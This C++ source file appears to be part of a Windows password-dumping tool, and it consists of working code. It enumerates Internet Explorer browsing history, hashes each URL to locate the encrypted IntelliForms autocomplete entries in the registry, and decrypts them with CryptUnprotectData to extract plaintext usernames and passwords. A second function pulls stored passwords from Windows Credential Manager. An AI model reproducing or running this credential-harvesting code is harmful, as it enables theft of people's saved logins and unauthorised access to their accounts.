
#include "InternetExplorer.h"
#include "help.h"
#include <iostream>
#include <wmistr.h>
#include <wincrypt.h>
#include <wincred.h>
#include <assert.h>
#include <windows.h>
#include <ShlObj.h>
#include "Shlwapi.h"
#include <atlconv.h>
#include <wininet.h>
#include <algorithm>
#include <functional>
#include <stdio.h>
#include <stdlib.h>
#include <objbase.h>
#include <shlguid.h>
#include <urlhist.h>
#include <atlstr.h>


#pragma comment(lib,"crypt32")
#pragma  comment(lib,"Shlwapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "comsuppwd.lib")
#pragma comment(lib, "Advapi32.lib")

typedef struct IESecretInfoHeader
{
	DWORD dwIdHeader;     
	DWORD dwSize;         
	DWORD dwTotalSecrets; 
	DWORD unknown;
	DWORD id4;           
	DWORD unknownZero;
}IESecretInfoHeader;

typedef struct IEAutoComplteSecretHeader
{
	DWORD dwSize;           
	DWORD dwSecretInfoSize; 
	DWORD dwSecretSize;     
	IESecretInfoHeader IESecretHeader;  
}IEAutoComplteSecretHeader;

const char strIEStorageKey[] = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";
typedef struct SecretEntry
{
	DWORD dwOffset;    
	BYTE  SecretId[8]; 
	DWORD dwLength;    
}SecretEntry;


char* return_buffer(const std::string& string)
{
	char* return_string = new char[string.length() + 1];
	strcpy(return_string, string.c_str());

	return return_string;
}
std::string narrow(std::wstring const& s,
	std::locale loc = std::locale())
{
	std::vector<char> result(4 * s.size() + 1);
	wchar_t const* fromNext;
	char* toNext;
	mbstate_t state = { 0 };
	std::codecvt_base::result convResult
		= std::use_facet<std::codecvt<wchar_t, char, std::mbstate_t> >(loc)
		.out(state, &s[0], &s[s.size()], fromNext,
			&result[0], &result[result.size()], toNext);

	assert(fromNext == &s[s.size()]);
	assert(toNext != &result[result.size()]);
	assert(convResult == std::codecvt_base::ok);
	*toNext = '\0';

	return &result[0];
}

std::wstring widen(std::string const& s,
	std::locale loc = std::locale())
{
	std::vector<wchar_t> result(s.size() + 1);
	char const* fromNext;
	wchar_t* toNext;
	mbstate_t state = { 0 };
	std::codecvt_base::result convResult
		= std::use_facet<std::codecvt<wchar_t, char, std::mbstate_t> >(loc)
		.in(state, &s[0], &s[s.size()], fromNext,
			&result[0], &result[result.size()], toNext);

	assert(fromNext == &s[s.size()]);
	assert(toNext != &result[result.size()]);
	assert(convResult == std::codecvt_base::ok);
	*toNext = L'\0';

	return &result[0];
}


void GetURLHashString(wchar_t *wstrURL, char *strHash, int dwSize)
{
	HCRYPTPROV hProv = NULL;
	HCRYPTHASH hHash = NULL;

	CryptAcquireContext(&hProv, 0, 0, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);

	CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash);

	if (CryptHashData(hHash, (unsigned char *)wstrURL, (wcslen(wstrURL) + 1) * 2, 0))
	{
		DWORD dwHashLen = 20;
		BYTE Buffer[20];

		if (CryptGetHashParam(hHash, HP_HASHVAL, Buffer, &dwHashLen, 0))
		{
			char TmpBuf[8];
			memset(TmpBuf, NULL, sizeof(TmpBuf));
			unsigned char tail = 0;

			for (int i = 0; i < 20; i++)
			{
				unsigned char c = Buffer[i];
				tail += c;
				sprintf_s(TmpBuf, sizeof(TmpBuf), "%2.2X", c);
				sprintf_s(strHash+strlen(strHash) * sizeof(char) ,1024, TmpBuf);
			}
			memset(TmpBuf, NULL, sizeof(TmpBuf));
			sprintf_s(TmpBuf, sizeof(TmpBuf), "%2.2X", tail);
			sprintf_s(strHash + strlen(strHash) * sizeof(char), 1024, TmpBuf);

		}

		CryptDestroyHash(hHash);
	}

	CryptReleaseContext(hProv, 0);
}




void  InternetExplorer::ListIEProtectedStorageSecrets(std::string siteName)
{
	try
	{
		HKEY hKey;
		LONG status;
		DWORD dwType;
		DWORD BufferLength = 4096;
		BYTE Buffer[4096];

		memset(Buffer, 0x00, sizeof(Buffer));
		std::wstring wUrl;
		if (!StringToWString(siteName, wUrl))
			return ;
		char strUrlHash[2048];
		memset(strUrlHash, NULL, sizeof(strUrlHash));
		GetURLHashString((wchar_t*)wUrl.c_str(), strUrlHash, sizeof(strUrlHash));
		
		if (ERROR_SUCCESS != RegOpenKeyEx(HKEY_CURRENT_USER, strIEStorageKey, 0, KEY_QUERY_VALUE, &hKey))
			return ;

		status = RegQueryValueEx(hKey, strUrlHash, 0, &dwType, Buffer, &BufferLength);
		RegCloseKey(hKey);

		if (status != ERROR_SUCCESS || strlen((char*)Buffer) < 1)
			return ;
	
		DATA_BLOB DataIn;
		DATA_BLOB DataOut;
		DATA_BLOB OptionalEntropy;
		DataIn.pbData = Buffer;
		DataIn.cbData = BufferLength;
		OptionalEntropy.pbData = (unsigned char*)wUrl.c_str();
		OptionalEntropy.cbData = (wcslen(wUrl.c_str()) + 1) * 2;

		WCHAR * wstrPassword = NULL;
		WCHAR * wstrUserName = NULL;
		if (CryptUnprotectData(&DataIn, NULL, &OptionalEntropy, 0, NULL, 0, &DataOut))
		{
			IEAutoComplteSecretHeader *IEAutoHeader = (IEAutoComplteSecretHeader*)DataOut.pbData;

			if (DataOut.cbData >= (IEAutoHeader->dwSize + IEAutoHeader->dwSecretInfoSize + IEAutoHeader->dwSecretSize))
			{
				int dwTotalSecrets = IEAutoHeader->IESecretHeader.dwTotalSecrets / 2;
				SecretEntry *secEntry = (SecretEntry*)(DataOut.pbData + sizeof(IEAutoComplteSecretHeader));
				BYTE *secOffset = (BYTE *)(DataOut.pbData + IEAutoHeader->dwSize + IEAutoHeader->dwSecretInfoSize);
				BYTE *curSecOffset;
				for (int i = 0; i < dwTotalSecrets; i++)
				{
					curSecOffset = secOffset + secEntry->dwOffset;
					wstrUserName = (WCHAR*)curSecOffset;
					secEntry++;
					curSecOffset = secOffset + secEntry->dwOffset;
					wstrPassword = (WCHAR*)curSecOffset;

//					printf("%S : username = %S & password = %S", siteName.c_str(), wstrUserName, wstrPassword);
					IeLoginInfo info;
					info.Url = siteName;
					if(!WStringToString(wstrUserName, info.UserName))
						return ;
					if (!WStringToString(wstrPassword, info.Password))
						return ;
					logins.push_back(info);
					secEntry++;

				}

			}

			
		}
		else
		{
			std::cerr << "Decrypt() fail with number: " << GetLastError() << std::endl;
		}
		if(DataOut.pbData)
			LocalFree(DataOut.pbData);
		
	}
	
	catch (const std::exception& e)
	{
		std::cout << e.what() << std::endl;
	}
	
	return	;
}
/*
 bool isAdministrator()
{
	AppDomain ad = Thread.GetDomain();
	ad.SetPrincipalPolicy(PrincipalPolicy.WindowsPrincipal);
	WindowsPrincipal user = (WindowsPrincipal)Thread.CurrentPrincipal;
	if (user.IsInRole(WindowsBuiltInRole.Administrator) ||
		user.IsInRole(WindowsBuiltInRole.Administrator))
		return true;
	return false;
}
*/

BOOL cred(TCHAR* ip, CString& usr, CString& pwd)
{
	usr.Empty();
	DWORD dwCount = 0;
	PCREDENTIAL * pCredArray = NULL;
	if (CredEnumerate(NULL, 0, &dwCount, &pCredArray))
	{
		for (DWORD dwIndex = 0; dwIndex < dwCount; dwIndex++)
		{
			PCREDENTIAL pCredential = pCredArray[dwIndex];
			CString target = pCredential->TargetName;
			if (target == ip)
			{
				usr = pCredential->UserName;
#ifdef _UNICODE
				pwd = (LPCWSTR)pCredential->CredentialBlob;
#else
				pwd = CW2A((LPCWSTR)pCredential->CredentialBlob);
#endif
				break;
			}
		}

		CredFree(pCredArray);
	}
	return (usr.GetLength() > 0);
}

static bool CheckIsRegister(std::string url)
{
	HKEY key;
	bool Reg = true;
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\MyKey\\"), &key) == ERROR_SUCCESS)
	{
		Reg = false;
	}

	return Reg;
}

std::vector<IeLoginInfo>& InternetExplorer::GetIEPaw()
{
	logins.clear();
	historyUrls.clear();
	wchar_t *p = NULL;
	IUrlHistoryStg2 *pUrlHistoryStg2 = NULL;
	IEnumSTATURL *pEnumUrls;
	STATURL StatUrl[1];
	ULONG ulFetched;
	HRESULT hr;
	CoInitialize(NULL);
	hr = CoCreateInstance(CLSID_CUrlHistory, NULL, CLSCTX_INPROC_SERVER, IID_IUrlHistoryStg2, (void**)(&pUrlHistoryStg2));
	if (SUCCEEDED(hr))
	{
		hr = pUrlHistoryStg2->EnumUrls(&pEnumUrls);
		if (SUCCEEDED(hr))
		{
			while ((hr = pEnumUrls->Next(1, StatUrl, &ulFetched)) == S_OK)
			{
				if (StatUrl->pwcsUrl != NULL)
				{
					if (NULL != (p = wcschr(StatUrl->pwcsUrl, '?')))
						*p = '\0';
					std::string url = CW2A(StatUrl->pwcsUrl);
					historyUrls.push_back(url);
					ListIEProtectedStorageSecrets(url);
				}
			}
			pEnumUrls->Release();
		}
		pUrlHistoryStg2->Release();
	}
	CoUninitialize();
	return logins;
}